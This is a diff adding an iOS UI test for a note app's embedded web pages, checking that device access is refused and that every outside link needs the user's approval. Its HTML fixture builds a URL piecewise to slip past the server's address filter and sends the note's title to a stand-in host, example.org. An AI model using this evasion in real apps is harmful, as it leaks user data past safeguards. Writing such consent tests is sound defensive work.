@@ -331,4 +331,54 @@ final class NoteAppsStagingUITests: XCTestCase {
         pause(0.8)
         shot("11-react-project-app")
     }
+
+    /// The address is put together in the app: the server refuses a page with an outside address
+    /// written in it, which an app that means to leak would get around the same way.
+    static let reaching = """
+    <!doctype html><html lang="en"><head><meta charset="utf-8"><title>Reach</title>
+    <style>body{font:17px -apple-system,system-ui;margin:24px;color:var(--amber-text,#222)}button{font:inherit;display:block;margin:12px 0;padding:12px 18px;border-radius:12px;border:1px solid #8884;background:transparent;color:inherit}</style></head>
+    <body><h1>Reach test</h1>
+    <button id="link">Open the site</button><button id="remind">Remind me</button><button id="where">Where am I</button>
+    <p id="out">Nothing yet</p>
+    <script>
+    const say = (r) => { document.getElementById("out").textContent = r && r.ok ? "It went ahead" : (r && r.error) || "No answer"; };
+    amber.onChange(() => {});
+    document.getElementById("link").onclick = () => amber.device.openURL(["https:", "", "example.org", "?note=" + encodeURIComponent(amber.note.title)].join("/")).then(say);
+    document.getElementById("remind").onclick = () => amber.device.reminders.create({ title: "Water" }).then(say);
+    document.getElementById("where").onclick = () => amber.device.location.once().then(say);
+    </script></body></html>
+    """
+
+    /// What an app can reach outside itself in the released app: a link only once the person has
+    /// seen all of it and agreed, each time; and nothing of the device, with a plain answer.
+    func testG_ALinkIsAskedAboutAndTheDeviceIsNotAvailable() throws {
+        _ = try connection()
+        let id = try note("Reach test", text: "An app that reaches outside itself.")
+        try mcp("set_note_page", ["id": id, "html": Self.reaching])
+        launch()
+        openNote("Reach test")
+        XCTAssertTrue(web("Remind me").waitForExistence(timeout: 30))
+        // The device: refused in the app, by name, with no system permission prompt.
+        let springboard = XCUIApplication(bundleIdentifier: "com.apple.springboard")
+        web("Remind me").tap()
+        XCTAssertTrue(web("Reminders aren't available in apps yet.").waitForExistence(timeout: 8))
+        web("Where am I").tap()
+        XCTAssertTrue(web("Location isn't available in apps yet.").waitForExistence(timeout: 8))
+        XCTAssertFalse(springboard.alerts.firstMatch.exists, "no permission is asked for")
+        shot("12-device-not-available")
+        // A link: the whole address, and a choice. Refused, nothing opens.
+        web("Open the site").tap()
+        let ask = app.alerts["This app wants to open a link"]
+        XCTAssertTrue(ask.waitForExistence(timeout: 8))
+        XCTAssertTrue(ask.staticTexts.containing(NSPredicate(format: "label CONTAINS 'https://example.org/?note=Reach%20test'")).firstMatch.exists, "the whole address shows")
+        shot("13-link-asked-about")
+        ask.buttons["Don't Allow"].tap()
+        XCTAssertTrue(web("You didn't open that link.").waitForExistence(timeout: 8))
+        XCTAssertEqual(app.state, .runningForeground)
+        // Asked again the next time, and opened only on Open.
+        web("Open the site").tap()
+        XCTAssertTrue(ask.waitForExistence(timeout: 8), "every link is asked about, not once per site")
+        ask.buttons["Open"].tap()
+        XCTAssertTrue(XCUIApplication(bundleIdentifier: "com.apple.mobilesafari").wait(for: .runningForeground, timeout: 15), "agreed to, the link opens in the browser")
+    }
 }
